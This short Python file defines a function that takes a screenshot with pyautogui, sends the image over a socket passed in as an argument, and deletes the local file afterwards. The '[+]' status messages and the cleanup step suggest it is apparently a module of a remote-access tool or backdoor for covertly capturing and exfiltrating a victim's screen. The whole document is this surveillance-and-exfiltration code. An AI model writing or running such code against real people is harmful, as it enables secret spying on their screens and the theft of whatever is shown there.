#pip install pyautogui
import pyautogui
import os

def captureScreenshot(my_socket):
    print("[+] Taking screenshot")
    screenshot = pyautogui.screenshot()
    screenshot_name = "screenshot.png"
    screenshot.save(screenshot_name)
    my_socket.sendFile(screenshot_name)
    print("[+] Screenshot sent.")
    os.remove(screenshot_name)